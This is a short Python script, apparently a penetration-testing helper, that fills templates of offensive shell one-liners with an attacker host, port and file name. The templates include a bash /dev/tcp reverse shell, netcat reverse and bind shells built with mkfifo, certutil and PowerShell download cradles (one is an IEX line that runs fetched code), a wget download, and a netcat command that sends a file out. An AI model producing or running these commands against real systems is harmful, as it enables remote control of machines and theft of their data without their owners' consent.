#!/usr/bin/env python3

from re import match
import argparse
import os
import re


Commands = {
    "bash"       : "bash -i >& /dev/tcp/$LHOST/$LPORT 2>&1",
    "certutil"   : "certutil -urlcache -split -f http://$LHOST/$FILE",
    "http"       : "http://$LHOST/$FILE",
    "netcat-bind": "mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/",
    "netcat-rev" : "mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f",
    "ps-download": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/$FILE','$FILE')\"",
    "ps-downx"   : "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:80/$FILE')\"",
    "wget"       : "wget http://$LHOST/$FILE",
    "nc-file"    : "nc -w 3 $LHOST $LPORT < $FILE", 
}

def replace(input, LHOST, LPORT, RHOST, FILE):
    output = input
    output = output.replace("$FILE", FILE)
    output = output.replace("$LHOST", LHOST)
    output = output.replace("$LPORT", LPORT)
    output = output.replace("$RHOST", RHOST)
    return output

def main(args):
    LHOST=os.environ.get("LHOST")
    LPORT=os.environ.get("LPORT")
    RHOST=os.environ.get("RHOST")
    FILE = args.file

    cmd = args.cmd
    if cmd == "all":
        args.all = True
    if args.list:
        print("\n#\n# COMMAND LIST\n#\n")
        for key in Commands.keys():
            print(f'{key : <20} : {Commands[key]}')
        exit()
    if args.all:
        print("\n#\n# ALL COMMANDS\n#\n")
        for key in Commands.keys():
            print(replace(Commands[key], LHOST, LPORT, RHOST, FILE))
        exit()
    if cmd:
        if cmd in Commands:
            print(replace(Commands[cmd], LHOST, LPORT, RHOST, FILE))
        else:
            print("Command not found")
    else:
        parser.print_help()

if __name__ == "__main__":
    parser = argparse.ArgumentParser('Command player')
    parser.add_argument('-a', '--all', dest='all', action='store_true', help='Fill all templates and display')
    parser.add_argument('-l', '--list', dest='list', action='store_true', help='List available templates')
    parser.add_argument('cmd',  nargs='?', type=str, default='all', help='Choose a command to play')
    parser.add_argument('file', nargs='?', type=str, default='', help='File to download' )
    args = parser.parse_args()
    main(args)